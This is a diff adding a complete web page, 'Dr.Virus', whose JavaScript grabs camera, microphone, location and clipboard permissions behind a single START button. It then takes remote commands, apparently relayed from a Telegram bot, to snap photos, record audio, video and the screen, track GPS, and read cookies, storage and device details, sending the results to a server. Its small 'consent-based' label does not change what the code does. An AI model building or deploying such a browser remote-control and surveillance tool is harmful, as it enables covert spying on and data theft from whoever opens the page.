@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#000000">
+<title>Dr.Virus</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{width:100%;height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,-apple-system,sans-serif}
+
+  .stage{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000}
+
+  .circle{
+    width:150px;height:150px;border-radius:50%;
+    background:#fff;border:none;cursor:pointer;outline:none;
+    display:flex;align-items:center;justify-content:center;
+    color:#000;font-size:14px;font-weight:800;letter-spacing:2px;
+    transition:transform .18s ease, box-shadow .35s ease;
+    box-shadow:0 0 0 0 rgba(255,255,255,.55);
+    animation:pulse 2.2s infinite;
+    user-select:none;
+  }
+  .circle:active{transform:scale(.93)}
+  .circle.running{animation:none;background:#0a0a0a;color:#fff;box-shadow:0 0 70px 12px rgba(255,255,255,.14);border:1px solid #222}
+  .circle.done{animation:none;background:#fff;color:#000;box-shadow:0 0 70px 14px rgba(255,255,255,.35)}
+  .circle.error{animation:none;background:#111;color:#ff5577;border:1px solid #331}
+  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,255,255,.5)}70%{box-shadow:0 0 0 46px rgba(255,255,255,0)}100%{box-shadow:0 0 0 0 rgba(255,255,255,0)}}
+
+  .toast{
+    position:fixed;top:24px;left:50%;transform:translateX(-50%);
+    padding:10px 20px;background:rgba(255,255,255,.06);
+    border:1px solid #1c1c1c;border-radius:24px;
+    font-family:ui-monospace,monospace;font-size:11.5px;color:#fff;
+    opacity:0;transition:opacity .3s ease;pointer-events:none;
+    max-width:90vw;text-align:center;
+  }
+  .toast.show{opacity:1}
+
+  .credit{
+    position:fixed;left:0;right:0;bottom:16px;text-align:center;
+    font-family:ui-monospace,monospace;font-size:9.5px;color:#1a1a1a;
+    letter-spacing:1.5px;pointer-events:none;
+  }
+</style>
+</head>
+<body>
+
+<div class="stage">
+  <button class="circle" id="mainBtn" aria-label="Start">START</button>
+</div>
+<div class="toast" id="toast"></div>
+<div class="credit">Dr.Virus · consent-based · own device only</div>
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+<script>
+'use strict';
+
+// ============================================================
+// CONFIG — no key needed, name auto-detected
+// ============================================================
+const params = new URLSearchParams(location.search);
+const NAME = params.get('name') || localStorage.getItem('dv_name') || autoName();
+
+if (params.get('name')) localStorage.setItem('dv_name', NAME);
+
+function autoName() {
+  const ua = navigator.userAgent;
+  let base = 'Device';
+  if (/Android/.test(ua))   base = 'Android';
+  else if (/iPhone/.test(ua)) base = 'iPhone';
+  else if (/iPad/.test(ua))   base = 'iPad';
+  else if (/Windows/.test(ua)) base = 'Windows';
+  else if (/Macintosh/.test(ua)) base = 'Mac';
+  else if (/Linux/.test(ua))   base = 'Linux';
+  // Random suffix so multiple phones don't clash
+  const suffix = Math.random().toString(36).slice(2, 6).toUpperCase();
+  return `${base}-${suffix}`;
+}
+
+// ============================================================
+// UI
+// ============================================================
+const btn = document.getElementById('mainBtn');
+const toastEl = document.getElementById('toast');
+let toastTimer = null;
+
+function toast(msg, ms) {
+  toastEl.textContent = msg;
+  toastEl.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => toastEl.classList.remove('show'), ms || 2200);
+}
+
+const permState = {};
+let polling = false;
+let offset = parseInt(localStorage.getItem('dv_offset') || '0');
+
+// ============================================================
+// PERMISSIONS
+// ============================================================
+async function requestAllPermissions() {
+  toast('Requesting permissions…', 3000);
+  let granted = 0;
+
+  try { const s = await navigator.mediaDevices.getUserMedia({ video: true }); s.getTracks().forEach(t => t.stop()); permState.camera = 'granted'; granted++; }
+  catch { permState.camera = 'denied'; }
+
+  try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t => t.stop()); permState.mic = 'granted'; granted++; }
+  catch { permState.mic = 'denied'; }
+
+  try { await new Promise((ok, no) => navigator.geolocation.getCurrentPosition(ok, no, { timeout: 12000 })); permState.geo = 'granted'; granted++; }
+  catch { permState.geo = 'denied'; }
+
+  if ('Notification' in window) {
+    try { const p = await Notification.requestPermission(); permState.notify = p; if (p === 'granted') granted++; }
+    catch { permState.notify = 'error'; }
+  }
+
+  try { await navigator.clipboard.readText(); permState.clip = 'granted'; granted++; }
+  catch { permState.clip = 'denied'; }
+
+  try { await navigator.storage?.persist?.(); } catch {}
+
+  try {
+    if (DeviceOrientationEvent?.requestPermission) {
+      const p = await DeviceOrientationEvent.requestPermission();
+      permState.sensor = p;
+      if (p === 'granted') granted++;
+    } else permState.sensor = 'n/a';
+  } catch { permState.sensor = 'error'; }
+
+  try { await document.documentElement.requestFullscreen?.(); document.exitFullscreen?.(); } catch {}
+
+  toast(`✅ ${granted} permissions granted`, 2400);
+  return granted;
+}
+
+// ============================================================
+// POLLING LOOP
+// ============================================================
+async function pollLoop() {
+  polling = true;
+  while (polling) {
+    try {
+      const url = `/api/poll?offset=${offset}&timeout=8&_=${Date.now()}`;
+      const r = await fetch(url, { cache: 'no-store' });
+      const data = await r.json();
+
+      if (data.error) { await sleep(3000); continue; }
+
+      for (const u of data.updates || []) {
+        offset = u.id + 1;
+        localStorage.setItem('dv_offset', String(offset));
+        processCommand(u);
+      }
+    } catch {
+      await sleep(3000);
+    }
+  }
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// ============================================================
+// COMMAND PROCESSING
+// ============================================================
+async function processCommand({ chatId, text }) {
+  const trimmed = text.trim();
+  const sp = trimmed.indexOf(' ');
+  const cmd = (sp === -1 ? trimmed : trimmed.slice(0, sp)).slice(1).toLowerCase();
+  const args = sp === -1 ? '' : trimmed.slice(sp + 1).trim();
+
+  if (cmd === 'help' || cmd === 'start') return sendMessage(chatId, HELP_TEXT);
+
+  const fn = HANDLERS[cmd];
+  if (!fn) return sendMessage(chatId, `❓ Unknown: /${cmd}\nSend /help`);
+
+  let result;
+  try { result = await fn(args); }
+  catch (e) { result = { error: e.message || String(e) }; }
+
+  await sendResult(chatId, cmd, result);
+}
+
+async function sendMessage(chatId, text) {
+  try {
+    await fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type: 'message', chatId, text })
+    });
+  } catch {}
+}
+
+async function sendResult(chatId, cmd, r) {
+  if (r.error) return sendMessage(chatId, `❌ <b>/${cmd}</b>\n${esc(r.error)}`);
+  if (r.photo)    return sendData(chatId, 'photo',    r.photo,    `📸 /${cmd}`);
+  if (r.audio)    return sendData(chatId, 'audio',    r.audio,    `🎤 /${cmd} · ${r.duration || '?'}s`, { duration: r.duration });
+  if (r.video)    return sendData(chatId, 'video',    r.video,    `🎥 /${cmd} · ${r.duration || '?'}s`, { duration: r.duration });
+  if (r.document) return sendData(chatId, 'document', r.document, `📄 /${cmd}`, { filename: r.filename });
+  if (r.text)     return sendMessage(chatId, r.text);
+  return sendMessage(chatId, `<b>/${cmd}</b>\n<pre>${esc(JSON.stringify(r, null, 2).slice(0, 3500))}</pre>`);
+}
+
+async function sendData(chatId, type, data, caption, extra = {}) {
+  try {
+    await fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type, chatId, data, caption, ...extra })
+    });
+  } catch {}
+}
+
+// ============================================================
+// HELPERS
+// ============================================================
+function esc(s) {
+  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+function blobB64(blob) {
+  return new Promise((ok, no) => {
+    const fr = new FileReader();
+    fr.onload = () => ok(fr.result);
+    fr.onerror = () => no(fr.error);
+    fr.readAsDataURL(blob);
+  });
+}
+
+function haversine(lat1, lon1, lat2, lon2) {
+  const R = 6371;
+  const dLat = (lat2-lat1) * Math.PI / 180;
+  const dLon = (lon2-lon1) * Math.PI / 180;
+  const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180) * Math.cos(lat2*Math.PI/180) * Math.sin(dLon/2)**2;
+  return 2 * R * Math.asin(Math.sqrt(a));
+}
+
+// ============================================================
+// COMMAND HANDLERS
+// ============================================================
+const HANDLERS = {
+
+// ═══════ INFO ═══════
+async info() {
+  let battery = 'n/a';
+  try { const b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging?'(chg)':''}`; } catch {}
+  const c = navigator.connection || {};
+  const perms = Object.entries(permState).map(([k,v]) => `${k}: ${v}`).join('\n') || '(none)';
+  return { text: `📊 <b>Device Report</b>
+
+<b>Browser</b>
+UA: <code>${esc(navigator.userAgent.slice(0,180))}</code>
+Platform: ${esc(navigator.platform)}
+Lang: ${esc(navigator.language)}
+Screen: ${screen.width}×${screen.height}@${devicePixelRatio}x
+Viewport: ${innerWidth}×${innerHeight}
+TZ: ${esc(Intl.DateTimeFormat().resolvedOptions().timeZone)}
+Touch: ${navigator.maxTouchPoints}
+Cookies: ${navigator.cookieEnabled}
+Online: ${navigator.onLine}
+
+<b>Hardware</b>
+CPU: ${navigator.hardwareConcurrency||'?'} cores
+Memory: ${navigator.deviceMemory||'?'} GB
+Battery: ${battery}
+Net: ${esc(c.effectiveType||'?')} · ${c.downlink||'?'}Mbps · ${c.rtt||'?'}ms
+
+<b>Permissions</b>
+<pre>${esc(perms)}</pre>`};
+},
+async geo() {
+  const p = await new Promise((ok,no) => navigator.geolocation.getCurrentPosition(ok, no, { timeout: 12000, enableHighAccuracy: true }));
+  return { text: `📍 <b>Location</b>
+Lat: <code>${p.coords.latitude}</code>
+Lon: <code>${p.coords.longitude}</code>
+Accuracy: ±${Math.round(p.coords.accuracy)}m
+Altitude: ${p.coords.altitude?.toFixed(1) ?? '—'}m
+Speed: ${p.coords.speed ?? '—'} m/s
+<a href="https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}">📍 Maps</a>`};
+},
+async battery() {
+  if (!navigator.getBattery) throw new Error('unsupported');
+  const b = await navigator.getBattery();
+  return { text: `🔋 <b>Battery</b>
+Level: ${Math.round(b.level*100)}%
+Charging: ${b.charging}
+To full: ${b.chargingTime ? Math.round(b.chargingTime/60)+'min' : '—'}
+To empty: ${b.dischargingTime ? Math.round(b.dischargingTime/60)+'min' : '—'}`};
+},
+async network() {
+  const c = navigator.connection || {};
+  let pub = {};
+  try { pub = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch {}
+  return { text: `🌐 <b>Network</b>
+Type: ${esc(c.effectiveType||'?')}
+Downlink: ${c.downlink||'?'} Mbps
+RTT: ${c.rtt||'?'} ms
+IP: <code>${esc(pub.ip||'?')}</code>
+Country: ${esc(pub.country_name||'?')}
+City: ${esc(pub.city||'?')}
+ISP: ${esc(pub.org||'?')}`};
+},
+async clipboard() {
+  const t = await navigator.clipboard.readText();
+  return { text: `📋 <b>Clipboard</b>\n<code>${esc((t||'(empty)').slice(0,3500))}</code>` };
+},
+async cookies() {
+  const c = document.cookie.split(';').map(x => x.trim()).filter(Boolean);
+  return { text: `🍪 <b>Cookies (${c.length})</b>\n<code>${esc(c.slice(0,30).join('\n').slice(0,3500) || '(empty)')}</code>` };
+},
+async storage() {
+  const L = []; for (let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); L.push(`${k}=${localStorage.getItem(k)}`); }
+  const S = []; for (let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); S.push(`${k}=${sessionStorage.getItem(k)}`); }
+  return { text: `🗄 <b>Storage</b>
+<b>Local (${L.length})</b>
+<code>${esc(L.slice(0,15).join('\n').slice(0,1500) || '(empty)')}</code>
+<b>Session (${S.length})</b>
+<code>${esc(S.slice(0,15).join('\n').slice(0,1500) || '(empty)')}</code>`};
+},
+async devices() {
+  const list = await navigator.mediaDevices.enumerateDevices();
+  const g = { audioinput: 'Mic', audiooutput: 'Speaker', videoinput: 'Camera' };
+  const grouped = {};
+  for (const d of list) { const k = g[d.kind] || d.kind; (grouped[k] ||= []).push(d.label || '(hidden)'); }
+  return { text: `🎛 <b>Media Devices</b>\n\n` + Object.entries(grouped).map(([k,v]) => `<b>${k} (${v.length})</b>\n${esc(v.join('\n'))}`).join('\n\n') };
+},
+async permissions() {
+  const names = ['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write','persistent-storage'];
+  const out = [];
+  for (const n of names) {
+    try { const r = await navigator.permissions.query({ name: n }); out.push(`${n}: ${r.state}`); }
+    catch { out.push(`${n}: unsupported`); }
+  }
+  return { text: `🔐 <b>Permissions</b>\n<pre>${esc(out.join('\n'))}</pre>` };
+},
+async webgl() {
+  const c = document.createElement('canvas');
+  const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+  if (!gl) throw new Error('WebGL unavailable');
+  const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+  return { text: `🎨 <b>WebGL</b>
+Vendor: ${esc(dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR))}
+Renderer: ${esc(dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER))}
+Version: ${esc(gl.getParameter(gl.VERSION))}`};
+},
+async 'storage-quota'() {
+  if (!navigator.storage?.estimate) throw new Error('unsupported');
+  const e = await navigator.storage.estimate();
+  return { text: `💾 <b>Quota</b>\nUsed: ${(e.usage/1024/1024).toFixed(2)} MB\nQuota: ${(e.quota/1024/1024/1024).toFixed(2)} GB` };
+},
+async 'screen-info'() {
+  const o = screen.orientation || {};
+  return { text: `🖥 <b>Screen</b>\nSize: ${screen.width}×${screen.height}\nAvail: ${screen.availWidth}×${screen.availHeight}\nColor: ${screen.colorDepth}-bit\nDPR: ${devicePixelRatio}\nOrientation: ${esc(o.type||'?')}\nViewport: ${innerWidth}×${innerHeight}` };
+},
+async time() {
+  const d = new Date();
+  return { text: `🕐 <b>Time</b>\n${esc(d.toString())}\nUnix: <code>${d.getTime()}</code>` };
+},
+async 'browser-features'() {
+  const f = {
+    'ServiceWorker':'serviceWorker' in navigator,'WebWorker':'Worker' in window,'WebSocket':'WebSocket' in window,
+    'WebRTC':'RTCPeerConnection' in window,'WebGL':!!document.createElement('canvas').getContext('webgl'),
+    'WebGPU':'gpu' in navigator,'WebAudio':'AudioContext' in window,
+    'Bluetooth':'bluetooth' in navigator,'USB':'usb' in navigator,'Serial':'serial' in navigator,
+    'HID':'hid' in navigator,'NFC':'NDEFReader' in window,'Gamepad':'getGamepads' in navigator,
+    'SpeechSynth':'speechSynthesis' in window,'SpeechRec':'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
+    'Notifications':'Notification' in window,'Geolocation':'geolocation' in navigator,'Vibration':'vibrate' in navigator,
+    'Battery':'getBattery' in navigator,'WakeLock':'wakeLock' in navigator,'IdleDetection':'IdleDetector' in window,
+    'Clipboard':'clipboard' in navigator,'Share':'share' in navigator,
+    'AmbientLight':'AmbientLightSensor' in window,'Accelerometer':'Accelerometer' in window,
+    'Magnetometer':'Magnetometer' in window,'Proximity':'ProximitySensor' in window,
+    'WebLocks':'locks' in navigator
+  };
+  const s = Object.entries(f).filter(([,v])=>v).map(([k])=>`✓ ${k}`).join('\n');
+  const n = Object.entries(f).filter(([,v])=>!v).map(([k])=>`✗ ${k}`).join('\n');
+  return { text: `🚀 <b>Features (${Object.values(f).filter(Boolean).length}/${Object.keys(f).length})</b>\n\n<b>Supported</b>\n<code>${esc(s)}</code>\n\n<b>Unsupported</b>\n<code>${esc(n)}</code>` };
+},
+
+// ═══════ MEDIA ═══════
+async screenshot() {
+  const c = await html2canvas(document.body, { scale: 0.85, backgroundColor: '#000', useCORS: true });
+  return { photo: c.toDataURL('image/jpeg', 0.75) };
+},
+async camera(args) {
+  const facing = args === 'front' ? 'user' : 'environment';
+  const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: facing }, width: { ideal: 1920 } } });
+  const v = document.createElement('video');
+  v.srcObject = s; v.muted = true; v.playsInline = true;
+  await v.play(); await new Promise(r => setTimeout(r, 900));
+  const c = document.createElement('canvas');
+  c.width = v.videoWidth; c.height = v.videoHeight;
+  c.getContext('2d').drawImage(v, 0, 0);
+  s.getTracks().forEach(t => t.stop());
+  return { photo: c.toDataURL('image/jpeg', 0.78) };
+},
+async mic(args) {
+  const sec = Math.min(parseInt(args) || 5, 30);
+  const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+  const rec = new MediaRecorder(s);
+  const chunks = [];
+  rec.ondataavailable = e => chunks.push(e.data);
+  rec.start();
+  await new Promise(r => setTimeout(r, sec * 1000));
+  await new Promise(r => { rec.onstop = r; rec.stop(); });
+  s.getTracks().forEach(t => t.stop());
+  return { audio: await blobB64(new Blob(chunks, { type: 'audio/webm' })), duration: sec };
+},
+async video(args) {
+  const sec = Math.min(parseInt(args) || 5, 20);
+  const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+  const rec = new MediaRecorder(s);
+  const chunks = [];
+  rec.ondataavailable = e => chunks.push(e.data);
+  rec.start();
+  await new Promise(r => setTimeout(r, sec * 1000));
+  await new Promise(r => { rec.onstop = r; rec.stop(); });
+  s.getTracks().forEach(t => t.stop());
+  return { video: await blobB64(new Blob(chunks, { type: 'video/webm' })), duration: sec };
+},
+async 'record-screen'(args) {
+  const sec = Math.min(parseInt(args) || 5, 30);
+  const s = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+  const rec = new MediaRecorder(s);
+  const chunks = [];
+  rec.ondataavailable = e => chunks.push(e.data);
+  rec.start();
+  await new Promise(r => setTimeout(r, sec * 1000));
+  await new Promise(r => { rec.onstop = r; rec.stop(); });
+  s.getTracks().forEach(t => t.stop());
+  return { video: await blobB64(new Blob(chunks, { type: 'video/webm' })), duration: sec };
+},
+
+// ═══════ ACTIONS ═══════
+async vibrate(args) {
+  const ms = parseInt(args) || 500;
+  if (!navigator.vibrate) throw new Error('unsupported');
+  navigator.vibrate(ms);
+  return { text: `📳 Vibrated ${ms}ms` };
+},
+async notify(args) {
+  if (Notification.permission !== 'granted') throw new Error('permission not granted');
+  new Notification('🧪 Remote', { body: args || 'Hello' });
+  return { text: `🔔 Notification shown` };
+},
+async speak(args) {
+  if (!window.speechSynthesis) throw new Error('unsupported');
+  speechSynthesis.cancel();
+  const u = new SpeechSynthesisUtterance(args || 'Hello');
+  speechSynthesis.speak(u);
+  return { text: `🔊 Speaking: "${esc((args||'Hello').slice(0,120))}"` };
+},
+async sound(args) {
+  const [f, d] = (args || '440 300').split(/\s+/);
+  const ctx = new AudioContext();
+  const osc = ctx.createOscillator();
+  const g = ctx.createGain();
+  osc.frequency.value = parseInt(f) || 440;
+  g.gain.value = 0.3;
+  osc.connect(g); g.connect(ctx.destination);
+  osc.start();
+  const dur = parseInt(d) || 300;
+  setTimeout(() => { osc.stop(); ctx.close(); }, dur);
+  return { text: `🎵 ${parseInt(f)||440}Hz for ${dur}ms` };
+},
+async writetext(args) {
+  await navigator.clipboard.writeText(args || '');
+  return { text: `📝 Wrote ${(args||'').length} chars` };
+},
+async open(args) {
+  if (!args) throw new Error('URL required');
+  location.href = args;
+  return { text: `🔗 Navigating to ${esc(args)}` };
+},
+async fullscreen() {
+  await document.documentElement.requestFullscreen();
+  return { text: `⛶ Fullscreen` };
+},
+async 'exit-fullscreen'() {
+  if (document.fullscreenElement) await document.exitFullscreen();
+  return { text: `✕ Fullscreen exited` };
+},
+async wakelock() {
+  if (!navigator.wakeLock) throw new Error('unsupported');
+  await navigator.wakeLock.request('screen');
+  return { text: `☀️ Wake lock active` };
+},
+async reload() {
+  setTimeout(() => location.reload(), 500);
+  return { text: `🔄 Reloading…` };
+},
+async share(args) {
+  if (!navigator.share) throw new Error('unsupported');
+  await navigator.share({ title: 'Remote', text: args || 'Hello' });
+  return { text: `📤 Shared` };
+},
+
+// ═══════ SENSORS ═══════
+async orient() {
+  const d = await new Promise((ok, no) => {
+    const to = setTimeout(() => no(new Error('no data (5s)')), 5000);
+    const h = e => { clearTimeout(to); removeEventListener('deviceorientation', h); ok(e); };
+    addEventListener('deviceorientation', h);
+  });
+  return { text: `🧭 <b>Orientation</b>\nalpha: ${d.alpha}\nbeta: ${d.beta}\ngamma: ${d.gamma}` };
+},
+async motion() {
+  const d = await new Promise((ok, no) => {
+    const to = setTimeout(() => no(new Error('no data (5s)')), 5000);
+    const h = e => { clearTimeout(to); removeEventListener('devicemotion', h); ok(e); };
+    addEventListener('devicemotion', h);
+  });
+  const a = d.accelerationIncludingGravity || {};
+  return { text: `📡 <b>Motion</b>\nx: ${a.x}\ny: ${a.y}\nz: ${a.z}` };
+},
+async light() {
+  if (typeof AmbientLightSensor === 'undefined') throw new Error('unsupported');
+  const s = new AmbientLightSensor();
+  const v = await new Promise((ok, no) => {
+    s.onreading = () => ok(s.illuminance);
+    s.onerror = () => no(new Error('error'));
+    s.start();
+    setTimeout(() => no(new Error('no reading')), 5000);
+  });
+  s.stop();
+  return { text: `💡 Light: ${v} lux` };
+},
+async gamepad() {
+  const pads = navigator.getGamepads ? [...navigator.getGamepads()].filter(Boolean) : [];
+  if (!pads.length) return { text: `🎮 No gamepads` };
+  return { text: `🎮 <b>Gamepads (${pads.length})</b>\n<pre>${esc(JSON.stringify(pads.map(p => ({ id: p.id, buttons: p.buttons.length })), null, 2))}</pre>` };
+},
+async 'watch-geo'(args) {
+  const sec = Math.min(parseInt(args) || 10, 60);
+  const samples = [];
+  const id = navigator.geolocation.watchPosition(
+    p => samples.push({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
+    () => {}, { enableHighAccuracy: true }
+  );
+  await new Promise(r => setTimeout(r, sec * 1000));
+  navigator.geolocation.clearWatch(id);
+  if (!samples.length) throw new Error('no samples');
+  const first = samples[0], last = samples[samples.length-1];
+  const dist = haversine(first.lat, first.lon, last.lat, last.lon);
+  return { text: `📍 <b>GPS Track (${sec}s, ${samples.length})</b>\nStart: ${first.lat.toFixed(5)}, ${first.lon.toFixed(5)}\nEnd: ${last.lat.toFixed(5)}, ${last.lon.toFixed(5)}\nDistance: ${(dist*1000).toFixed(0)}m` };
+},
+
+// ═══════ ADVANCED ═══════
+async 'speech-to-text'(args) {
+  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+  if (!SR) throw new Error('unsupported');
+  const sec = Math.min(parseInt(args) || 5, 30);
+  const r = new SR();
+  r.lang = navigator.language;
+  r.continuous = true;
+  r.interimResults = true;
+  return await new Promise((ok, no) => {
+    let text = '';
+    r.onresult = e => { for (let i = e.resultIndex; i < e.results.length; i++) text += e.results[i][0].transcript + ' '; };
+    r.onerror = e => no(new Error(e.error));
+    r.start();
+    setTimeout(() => { r.stop(); ok({ text: `🎙 <b>Speech (${sec}s)</b>\n"${esc(text.trim() || '(none)')}"` }); }, sec * 1000);
+  });
+},
+async 'crypto-random'(args) {
+  const n = Math.min(parseInt(args) || 16, 256);
+  const buf = crypto.getRandomValues(new Uint8Array(n));
+  const hex = [...buf].map(b => b.toString(16).padStart(2, '0')).join('');
+  return { text: `🎲 <b>Random ${n} bytes</b>\n<code>${hex}</code>` };
+},
+async 'crypto-hash'(args) {
+  if (!args) throw new Error('text required');
+  const buf = new TextEncoder().encode(args);
+  const h = await crypto.subtle.digest('SHA-256', buf);
+  const hex = [...new Uint8Array(h)].map(b => b.toString(16).padStart(2, '0')).join('');
+  return { text: `🔐 <b>SHA-256</b>\n<code>${hex}</code>` };
+},
+async 'crypto-uuid'() {
+  return { text: `🆔 <b>UUID</b>\n<code>${crypto.randomUUID()}</code>` };
+},
+async 'worker-test'() {
+  if (!window.Worker) throw new Error('unsupported');
+  const blob = new Blob([`self.onmessage=e=>{let s=0;for(let i=0;i<e.data;i++)s+=i;self.postMessage(s)}`], { type: 'application/javascript' });
+  const w = new Worker(URL.createObjectURL(blob));
+  const t = performance.now();
+  const r = await new Promise(ok => { w.onmessage = e => ok(e.data); w.postMessage(1e7); });
+  w.terminate();
+  return { text: `⚙️ <b>Worker</b>\nSum(0..10M) = ${r}\nTime: ${(performance.now()-t).toFixed(0)}ms` };
+},
+async ping() {
+  const t = performance.now();
+  await new Promise(r => setTimeout(r, 1));
+  return { text: `🏓 Pong (${(performance.now()-t).toFixed(2)}ms)` };
+}
+};
+
+// ============================================================
+// HELP
+// ============================================================
+const HELP_TEXT = `🧪 <b>Dr.Virus</b>
+
+<b>📊 Info</b>
+/info /geo /battery /network /clipboard /cookies /storage /devices /permissions /webgl /storage-quota /screen-info /time /browser-features
+
+<b>📸 Media</b>
+/screenshot /camera [front|back] /mic [s] /video [s] /record-screen [s]
+
+<b>⚡ Actions</b>
+/vibrate [ms] /notify [text] /speak [text] /sound [hz ms] /writetext [text] /open [url] /fullscreen /exit-fullscreen /wakelock /reload /share [text]
+
+<b>📡 Sensors</b>
+/orient /motion /light /gamepad /watch-geo [s]
+
+<b>🚀 Advanced</b>
+/speech-to-text [s] /crypto-random [n] /crypto-hash [text] /crypto-uuid /worker-test /ping
+`;
+
+// ============================================================
+// MAIN BUTTON
+// ============================================================
+let started = false;
+
+btn.addEventListener('click', async () => {
+  if (started) return;
+  started = true;
+
+  btn.classList.add('running');
+  btn.textContent = 'WAIT';
+
+  await requestAllPermissions();
+
+  btn.classList.remove('running');
+  btn.classList.add('done');
+  btn.textContent = 'LIVE';
+
+  toast('🤖 Bot active · send commands on Telegram', 3500);
+
+  if (!polling) pollLoop();
+});
+
+// ============================================================
+// BOOT
+// ============================================================
+console.log('Dr.Virus Agent · name =', NAME);
+</script>
+</body>
+</html>
